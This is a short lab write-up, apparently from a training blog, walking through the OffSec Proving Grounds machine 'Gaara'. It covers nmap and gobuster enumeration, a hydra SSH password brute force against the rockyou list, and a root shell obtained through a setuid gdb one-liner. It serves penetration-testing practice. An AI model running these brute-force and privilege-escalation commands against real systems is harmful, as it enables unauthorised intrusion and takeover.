---
title: OffSec PG - Gaara
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.208.142`

### Network Scan

Nmap scan &rarr; `nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.208.142 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

This did not reveal any useful information.

---

## Exploitation

Using the image on the webpage as a reference, the username could be `gaara`. Therefore, used hydra to brute force the ssh server against the rockyou password list.

```other
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.208.142:22
```

This gives the password as `iloveyou2` and subsequently gets the user flag.

---

## Privilege Escalation

Checking for setuid binaries reveals the presence of `gdb` as a setuid to root executable. The user is not present in the sudoers file. Therefore, it is essential to escalate using the `gdb` binary.

This is done as follows &rarr; `gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`.

This grants the root shell and subsequently the root flag.

---
